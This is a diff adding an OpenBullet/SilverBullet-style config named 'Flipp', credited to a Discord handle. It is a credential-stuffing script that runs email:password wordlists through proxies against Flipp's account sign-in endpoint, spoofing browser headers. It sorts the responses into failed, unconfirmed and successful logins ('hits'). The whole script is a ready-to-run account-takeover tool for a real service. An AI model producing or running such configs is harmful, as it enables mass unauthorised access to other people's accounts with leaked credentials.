@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "Flipp",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-25T09:41:30.0463052+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Flipp",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://cdn-gateflipp.flippback.com/accounts/email/signin" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"locale\":\"en\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: cdn-gateflipp.flippback.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Content-Length: 68" 
+  HEADER "Origin: https://flipp.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://flipp.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "TE: trailers" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "INVALID_CREDENTIALS" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "USER_NOT_CONFIRMED" 
+  KEYCHAIN Success OR 
+    KEY "{\"user\":{\"created_at\":\"" 
+
+FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By" 
+
